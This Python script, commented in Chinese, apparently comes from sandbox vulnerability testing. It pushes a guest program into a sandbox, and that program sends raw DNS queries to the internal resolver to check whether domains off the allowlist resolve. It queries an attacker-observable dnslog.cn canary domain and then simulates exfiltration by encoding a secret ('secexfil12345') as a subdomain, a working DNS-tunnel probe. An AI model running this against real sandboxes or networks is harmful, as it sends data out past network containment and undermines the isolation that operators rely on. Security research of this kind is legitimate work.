# -*- coding: utf-8 -*-
"""Phase6: 内网 DNS 递归行为 - 非白名单域名是否放行(DNS 隧道可行性)"""
import sys, time, struct
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_BQJ2aL59BOiIDLDpm6guM4rpiJih"

GUEST = r'''
import socket, struct

def dnsq(name, qtype=1):
    qid = 0x3333
    hdr = struct.pack('!HHHHHH', qid, 0x0100, 1, 0, 0, 0)
    qname = b''.join(bytes([len(x)]) + x.encode() for x in name.split('.')) + b'\x00'
    q = hdr + qname + struct.pack('!HH', qtype, 1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(6)
    s.sendto(q, ('172.31.0.2', 53))
    try:
        r = s.recv(4096)
        # 解析响应头: qid flags qd an ns ar
        f = struct.unpack('!HHHHHH', r[:12])
        print('[%s] resp_len=%d qid=0x%04x flags=0x%04x an=%d' % (name, len(r), f[0], f[1], f[3]), flush=True)
        # 显示附加数据(如 CNAME/TXT 内容)
        if len(r) > 12:
            print('  tail:', r[12:min(len(r), 200)].hex()[:120], flush=True)
    except Exception as e:
        print('[%s] EXC %s: %s' % (name, type(e).__name__, e), flush=True)
    finally:
        s.close()

# 白名单域名
dnsq('webhook.site')
# 非白名单外部域
dnsq('vercel.com')
dnsq('github.com')
# dnslog(关键: 攻击者可观察的域名)
dnsq('vckxg8.dnslog.cn')
# 带数据的 DNS 隧道模拟(子域编码 secret)
dnsq('secexfil12345.vckxg8.dnslog.cn')
print('done', flush=True)
'''

code = "cat > /tmp/pg14.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg14.py"

if __name__ == "__main__":
    # 保持 custom + webhook.site 白名单
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=90000)
    print('cmd:', c, flush=True)
    print(r[:5000], flush=True)
